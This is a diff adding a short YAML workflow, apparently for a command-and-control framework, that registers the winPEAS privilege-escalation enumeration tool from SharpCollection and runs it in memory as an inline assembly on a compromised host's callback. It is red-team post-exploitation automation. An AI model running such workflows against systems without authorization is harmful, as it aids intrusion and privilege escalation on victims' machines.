@@ -1,0 +1,37 @@
+name: "forget_net_winPEAS"
+description: "Register and run winPEAS via forge_net"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# winPEAS
+###########################################################
+  - name: "register forge_net_winPEAS"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: winPEAS
+        remove: false
+
+  - name: "execute forge_net_winPEAS"
+    depends_on:
+      - "register forge_net_winPEAS"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_winPEAS
+      payload_type: forge
+      params_dictionary:
+        args: notcolor
+        version: 4.7_Any
+        execution: inline_assembly
